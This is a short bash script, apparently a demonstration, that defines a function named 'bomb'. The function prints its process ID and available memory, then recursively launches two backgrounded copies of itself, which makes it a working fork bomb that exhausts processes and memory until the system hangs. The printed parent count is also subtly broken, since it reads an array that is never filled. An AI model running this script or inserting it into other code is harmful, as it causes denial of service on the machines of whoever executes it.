#!/bin/bash

printf 'PID\t\t# Parents\t\tMem Avail\n'

bomb() {
    declare available_mem
    declare -i pid="$$"
    declare -ai ancestors

    while [ -f "/proc/$pid/status" ]; do
        pid="$(
            awk '/PPid/ { print $2 }' "/proc/$pid/status"
        )"
        [ "$pid" != '' ] && pid_list+=( "$pid" )
    done
    available_mem="$(
        free -mh | awk '/Mem:/ { print $7 }'
    )"
    printf '%s\t\t%s\t\t%s\n' "$$" "${#ancestors[@]}" "$available_mem"
    # Here is where the magic happens
    bomb | bomb 2>/dev/null & 
} 
bomb